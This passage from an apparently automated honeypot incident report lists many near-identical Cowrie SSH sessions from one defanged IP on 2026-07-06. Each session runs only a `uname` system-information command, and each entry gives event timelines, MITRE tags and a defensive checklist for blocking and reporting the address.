| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:14` | `cowrie.session.connect` |
| `2026-07-06 09:28:14` | `cowrie.client.version` |
| `2026-07-06 09:28:15` | `cowrie.client.kex` |
| `2026-07-06 09:28:16` | `cowrie.login.success` |
| `2026-07-06 09:28:17` | `cowrie.session.params` |
| `2026-07-06 09:28:17` | `cowrie.command.input` |
| `2026-07-06 09:28:17` | `cowrie.log.closed` |
| `2026-07-06 09:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a688da682686

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:17` | `cowrie.session.connect` |
| `2026-07-06 09:28:17` | `cowrie.client.version` |
| `2026-07-06 09:28:17` | `cowrie.client.kex` |
| `2026-07-06 09:28:18` | `cowrie.login.success` |
| `2026-07-06 09:28:19` | `cowrie.session.params` |
| `2026-07-06 09:28:19` | `cowrie.command.input` |
| `2026-07-06 09:28:19` | `cowrie.log.closed` |
| `2026-07-06 09:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f5c87d833b5

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:21` | `cowrie.session.connect` |
| `2026-07-06 09:28:21` | `cowrie.client.version` |
| `2026-07-06 09:28:21` | `cowrie.client.kex` |
| `2026-07-06 09:28:22` | `cowrie.login.success` |
| `2026-07-06 09:28:23` | `cowrie.session.params` |
| `2026-07-06 09:28:23` | `cowrie.command.input` |
| `2026-07-06 09:28:23` | `cowrie.log.closed` |
| `2026-07-06 09:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d50f73e1460

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:22` | `cowrie.session.connect` |
| `2026-07-06 09:28:22` | `cowrie.client.version` |
| `2026-07-06 09:28:22` | `cowrie.client.kex` |
| `2026-07-06 09:28:23` | `cowrie.login.success` |
| `2026-07-06 09:28:25` | `cowrie.session.params` |
| `2026-07-06 09:28:25` | `cowrie.command.input` |
| `2026-07-06 09:28:25` | `cowrie.log.closed` |
| `2026-07-06 09:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ccec06f070b

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:25` | `cowrie.session.connect` |
| `2026-07-06 09:28:25` | `cowrie.client.version` |
| `2026-07-06 09:28:25` | `cowrie.client.kex` |
| `2026-07-06 09:28:25` | `cowrie.login.success` |
| `2026-07-06 09:28:26` | `cowrie.session.params` |
| `2026-07-06 09:28:26` | `cowrie.command.input` |
| `2026-07-06 09:28:26` | `cowrie.log.closed` |
| `2026-07-06 09:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66318809f3d4

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:27` | `cowrie.session.connect` |
| `2026-07-06 09:28:27` | `cowrie.client.version` |
| `2026-07-06 09:28:27` | `cowrie.client.kex` |
| `2026-07-06 09:28:29` | `cowrie.login.success` |
| `2026-07-06 09:28:30` | `cowrie.session.params` |
| `2026-07-06 09:28:30` | `cowrie.command.input` |
| `2026-07-06 09:28:30` | `cowrie.log.closed` |
| `2026-07-06 09:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdfa0fdb8b38

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:29` | `cowrie.session.connect` |
| `2026-07-06 09:28:29` | `cowrie.client.version` |
| `2026-07-06 09:28:29` | `cowrie.client.kex` |
| `2026-07-06 09:28:31` | `cowrie.login.success` |
| `2026-07-06 09:28:32` | `cowrie.session.params` |
| `2026-07-06 09:28:32` | `cowrie.command.input` |
| `2026-07-06 09:28:33` | `cowrie.log.closed` |
| `2026-07-06 09:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aac2440c953

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:30` | `cowrie.session.connect` |
| `2026-07-06 09:28:30` | `cowrie.client.version` |
| `2026-07-06 09:28:30` | `cowrie.client.kex` |
| `2026-07-06 09:28:31` | `cowrie.login.success` |
| `2026-07-06 09:28:33` | `cowrie.session.params` |
| `2026-07-06 09:28:33` | `cowrie.command.input` |
| `2026-07-06 09:28:33` | `cowrie.log.closed` |
| `2026-07-06 09:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-860da93dc055

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:33` | `cowrie.session.connect` |
| `2026-07-06 09:28:33` | `cowrie.client.version` |
| `2026-07-06 09:28:33` | `cowrie.client.kex` |
| `2026-07-06 09:28:34` | `cowrie.login.success` |
| `2026-07-06 09:28:36` | `cowrie.session.params` |
| `2026-07-06 09:28:36` | `cowrie.command.input` |
| `2026-07-06 09:28:36` | `cowrie.log.closed` |
| `2026-07-06 09:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-520dece7f742

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:33` | `cowrie.session.connect` |
| `2026-07-06 09:28:33` | `cowrie.client.version` |
| `2026-07-06 09:28:33` | `cowrie.client.kex` |
| `2026-07-06 09:28:34` | `cowrie.login.success` |
| `2026-07-06 09:28:35` | `cowrie.session.params` |
| `2026-07-06 09:28:35` | `cowrie.command.input` |
| `2026-07-06 09:28:36` | `cowrie.log.closed` |
| `2026-07-06 09:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c317601063b7

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:36` | `cowrie.session.connect` |
| `2026-07-06 09:28:36` | `cowrie.client.version` |
| `2026-07-06 09:28:36` | `cowrie.client.kex` |
| `2026-07-06 09:28:37` | `cowrie.login.success` |
| `2026-07-06 09:28:38` | `cowrie.session.params` |
| `2026-07-06 09:28:38` | `cowrie.command.input` |
| `2026-07-06 09:28:38` | `cowrie.log.closed` |
| `2026-07-06 09:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ce058ce90c3

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:36` | `cowrie.session.connect` |
| `2026-07-06 09:28:36` | `cowrie.client.version` |
| `2026-07-06 09:28:37` | `cowrie.client.kex` |
| `2026-07-06 09:28:38` | `cowrie.login.success` |
| `2026-07-06 09:28:39` | `cowrie.session.params` |
| `2026-07-06 09:28:39` | `cowrie.command.input` |
| `2026-07-06 09:28:39` | `cowrie.log.closed` |
| `2026-07-06 09:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afdcde635648

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:39` | `cowrie.session.connect` |
| `2026-07-06 09:28:39` | `cowrie.client.version` |
| `2026-07-06 09:28:39` | `cowrie.client.kex` |
| `2026-07-06 09:28:40` | `cowrie.login.success` |
| `2026-07-06 09:28:41` | `cowrie.session.params` |
| `2026-07-06 09:28:41` | `cowrie.command.input` |
| `2026-07-06 09:28:41` | `cowrie.log.closed` |
| `2026-07-06 09:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93430a38f33

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:43` | `cowrie.session.connect` |
| `2026-07-06 09:28:43` | `cowrie.client.version` |
| `2026-07-06 09:28:43` | `cowrie.client.kex` |
| `2026-07-06 09:28:43` | `cowrie.login.success` |
| `2026-07-06 09:28:44` | `cowrie.session.params` |
| `2026-07-06 09:28:44` | `cowrie.command.input` |
| `2026-07-06 09:28:44` | `cowrie.log.closed` |
| `2026-07-06 09:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9dd9d489aa1

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:46` | `cowrie.session.connect` |
| `2026-07-06 09:28:46` | `cowrie.client.version` |
| `2026-07-06 09:28:46` | `cowrie.client.kex` |
| `2026-07-06 09:28:47` | `cowrie.login.success` |
| `2026-07-06 09:28:48` | `cowrie.session.params` |
| `2026-07-06 09:28:48` | `cowrie.command.input` |
| `2026-07-06 09:28:48` | `cowrie.log.closed` |
| `2026-07-06 09:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fa96c29badd

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:49` | `cowrie.session.connect` |
| `2026-07-06 09:28:49` | `cowrie.client.version` |
| `2026-07-06 09:28:50` | `cowrie.client.kex` |
| `2026-07-06 09:28:50` | `cowrie.login.success` |
| `2026-07-06 09:28:51` | `cowrie.session.params` |
| `2026-07-06 09:28:51` | `cowrie.command.input` |
| `2026-07-06 09:28:51` | `cowrie.log.closed` |
| `2026-07-06 09:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10e5065faf76

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:56` | `cowrie.session.connect` |
| `2026-07-06 09:28:56` | `cowrie.client.version` |
| `2026-07-06 09:28:57` | `cowrie.client.kex` |
| `2026-07-06 09:28:57` | `cowrie.login.success` |
| `2026-07-06 09:28:58` | `cowrie.session.params` |
| `2026-07-06 09:28:58` | `cowrie.command.input` |
| `2026-07-06 09:28:58` | `cowrie.log.closed` |
| `2026-07-06 09:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187393e11fa6

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:59` | `cowrie.session.connect` |
| `2026-07-06 09:28:59` | `cowrie.client.version` |
| `2026-07-06 09:29:00` | `cowrie.client.kex` |
| `2026-07-06 09:29:00` | `cowrie.login.success` |
| `2026-07-06 09:29:02` | `cowrie.session.params` |
| `2026-07-06 09:29:02` | `cowrie.command.input` |
| `2026-07-06 09:29:02` | `cowrie.log.closed` |
| `2026-07-06 09:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ceb530b6ea6

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:02` | `cowrie.session.connect` |
| `2026-07-06 09:29:02` | `cowrie.client.version` |
| `2026-07-06 09:29:02` | `cowrie.client.kex` |
| `2026-07-06 09:29:03` | `cowrie.login.success` |
| `2026-07-06 09:29:03` | `cowrie.session.params` |
| `2026-07-06 09:29:03` | `cowrie.command.input` |
| `2026-07-06 09:29:04` | `cowrie.log.closed` |
| `2026-07-06 09:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19cefd1178e5

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:03` | `cowrie.session.connect` |
| `2026-07-06 09:29:03` | `cowrie.client.version` |
| `2026-07-06 09:29:03` | `cowrie.client.kex` |
| `2026-07-06 09:29:04` | `cowrie.login.success` |
| `2026-07-06 09:29:05` | `cowrie.session.params` |
| `2026-07-06 09:29:05` | `cowrie.command.input` |
| `2026-07-06 09:29:06` | `cowrie.log.closed` |
| `2026-07-06 09:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f5d825abf3c

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:04` | `cowrie.session.connect` |
| `2026-07-06 09:29:04` | `cowrie.client.version` |
| `2026-07-06 09:29:04` | `cowrie.client.kex` |
| `2026-07-06 09:29:05` | `cowrie.login.success` |
| `2026-07-06 09:29:06` | `cowrie.session.params` |
| `2026-07-06 09:29:06` | `cowrie.command.input` |
| `2026-07-06 09:29:07` | `cowrie.log.closed` |
| `2026-07-06 09:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33e848a1f619

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:05` | `cowrie.session.connect` |
| `2026-07-06 09:29:05` | `cowrie.client.version` |
| `2026-07-06 09:29:06` | `cowrie.client.kex` |
| `2026-07-06 09:29:07` | `cowrie.login.success` |
| `2026-07-06 09:29:09` | `cowrie.session.params` |
| `2026-07-06 09:29:09` | `cowrie.command.input` |
| `2026-07-06 09:29:09` | `cowrie.log.closed` |
| `2026-07-06 09:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80765867beb1

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:06` | `cowrie.session.connect` |
| `2026-07-06 09:29:06` | `cowrie.client.version` |
| `2026-07-06 09:29:06` | `cowrie.client.kex` |
| `2026-07-06 09:29:07` | `cowrie.login.success` |
| `2026-07-06 09:29:08` | `cowrie.session.params` |
| `2026-07-06 09:29:08` | `cowrie.command.input` |
| `2026-07-06 09:29:09` | `cowrie.log.closed` |
| `2026-07-06 09:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52587de70e61

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:09` | `cowrie.session.connect` |
| `2026-07-06 09:29:09` | `cowrie.client.version` |
| `2026-07-06 09:29:09` | `cowrie.client.kex` |
| `2026-07-06 09:29:09` | `cowrie.login.success` |
| `2026-07-06 09:29:11` | `cowrie.session.params` |
| `2026-07-06 09:29:11` | `cowrie.command.input` |
| `2026-07-06 09:29:11` | `cowrie.log.closed` |
| `2026-07-06 09:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2463b5bf878c

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:11` | `cowrie.session.connect` |
| `2026-07-06 09:29:11` | `cowrie.client.version` |
| `2026-07-06 09:29:11` | `cowrie.client.kex` |
| `2026-07-06 09:29:12` | `cowrie.login.success` |
| `2026-07-06 09:29:13` | `cowrie.session.params` |
| `2026-07-06 09:29:13` | `cowrie.command.input` |
| `2026-07-06 09:29:13` | `cowrie.log.closed` |
| `2026-07-06 09:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fbc098cb0db

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:29 |
| **Last Seen** | 2026-07-06 09:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:29:11` | `cowrie.session.connect` |
| `2026-07-06 09:29:11` | `cowrie.client.version` |
| `2026-07-06 09:29:11` | `cowrie.client.kex` |
| `2026-07-06 09:29:12` | `cowrie.login.success` |
| `2026-07-06 09:29:13` | `cowrie.session.params` |
| `2026-07-06 09:29:13` | `cowrie.command.input` |
| `2026-07-06 09:29:13` | `cowrie.log.closed` |
| `2026-07-06 09:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
